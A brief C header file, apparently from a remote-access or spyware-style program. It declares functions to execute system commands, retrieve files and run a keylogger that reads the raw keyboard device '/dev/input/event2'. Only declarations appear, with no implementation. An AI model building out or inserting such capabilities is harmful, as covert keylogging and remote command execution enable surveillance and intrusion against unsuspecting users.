#ifndef FUNCTIONALITY_H
#define FUNCTIONALITY_H

#include "sharedLibrary.h"

#ifdef __linux__
#include <sys/epoll.h>

#endif

#define KEYBOARD_DEVICE "/dev/input/event2"

void executeSystemCall(char *command);
void retrieveFile(char *file);
void keylogger();

#endif
